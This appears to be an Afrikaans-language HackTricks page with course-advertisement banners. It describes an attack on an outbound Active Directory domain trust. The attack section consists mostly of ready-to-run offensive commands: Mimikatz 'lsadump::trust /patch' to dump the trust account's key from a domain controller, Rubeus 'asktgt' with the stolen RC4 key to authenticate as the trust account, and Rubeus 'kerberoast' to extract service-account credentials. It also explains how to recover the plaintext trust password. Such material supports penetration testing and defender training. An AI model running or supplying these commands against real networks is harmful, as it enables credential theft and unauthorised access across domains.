# Eksterne Bosveld Domein - Eenrigting (Uitgaande)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

In hierdie scenario **vertrou jou domein** sekere **voorregte** toe aan 'n **beginsel van 'n ander domein**.

## Opname

### Uitgaande Vertroue
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Vertrouensrekening Aanval

'n Sekuriteitskwesbaarheid bestaan wanneer 'n vertrouensverhouding tussen twee domeine, hier geïdentifiseer as domein **A** en domein **B**, opgerig word waar domein **B** sy vertroue na domein **A** uitbrei. In hierdie opset word 'n spesiale rekening in domein **A** vir domein **B** geskep, wat 'n kritieke rol speel in die verifikasieproses tussen die twee domeine. Hierdie rekening, wat verband hou met domein **B**, word gebruik om kaartjies te enkripteer vir toegang tot dienste oor die domeine.

Die kritieke aspek om hier te verstaan, is dat die wagwoord en has van hierdie spesiale rekening uit 'n Domeinbeheerder in domein **A** geëkstraheer kan word met behulp van 'n opdraglyn-hulpmiddel. Die opdrag om hierdie aksie uit te voer is:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Hierdie onttrekking is moontlik omdat die rekening, geïdentifiseer met 'n **$** na sy naam, aktief is en behoort tot die "Domain Users" groep van domein **A**, en dus die toestemmings wat met hierdie groep geassosieer word, erf. Dit stel individue in staat om teen domein **A** te verifieer met behulp van die geloofsbriewe van hierdie rekening.

**Waarskuwing:** Dit is moontlik om van hierdie situasie gebruik te maak om 'n voet in die deur te kry in domein **A** as 'n gebruiker, alhoewel met beperkte toestemmings. Hierdie toegang is egter voldoende om opname op domein **A** uit te voer.

In 'n scenario waar `ext.local` die vertrouende domein is en `root.local` die vertroude domein is, sal 'n gebruikersrekening met die naam `EXT$` binne `root.local` geskep word. Deur spesifieke gereedskap te gebruik, is dit moontlik om die Kerberos-vertrouensleutels te dump, wat die geloofsbriewe van `EXT$` in `root.local` onthul. Die opdrag om dit te bereik is:
```bash
lsadump::trust /patch
```
Volgens hierdie metode kan die geëkstraeerde RC4-sleutel gebruik word om as `root.local\EXT$` te verifieer binne `root.local` deur 'n ander opdrag te gebruik:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Hierdie verifikasie stap maak dit moontlik om dienste binne `root.local` te ondersoek en selfs uit te buit, soos om 'n Kerberoast aanval uit te voer om diensrekeninggelde te onttrek deur gebruik te maak van:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Versameling van duidelike vertrouwenswagwoord

In die vorige stroom is die vertrouenshash gebruik in plaas van die **duidelike teks wagwoord** (wat ook deur mimikatz **uitgelek** is).

Die duidelike wagwoord kan verkry word deur die \[ CLEAR ] uitset van mimikatz van heksadesimale na teks om te skakel en nulbyte '\x00' te verwyder:

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Soms, wanneer 'n vertrouensverhouding geskep word, moet 'n wagwoord deur die gebruiker ingetik word vir die vertroue. In hierdie demonstrasie is die sleutel die oorspronklike vertrouenswagwoord en dus leesbaar vir mense. Aangesien die sleutel siklies is (30 dae), sal die duidelike teks nie leesbaar wees nie, maar tegnies steeds bruikbaar.

Die duidelike wagwoord kan gebruik word om gereelde verifikasie uit te voer as die vertroue-rekening, as 'n alternatief vir die aanvra van 'n TGT deur die Kerberos-geheime sleutel van die vertroue-rekening te gebruik. Hier word navraag gedoen na root.local vanaf ext.local vir lede van Domain Admins:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Verwysings

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
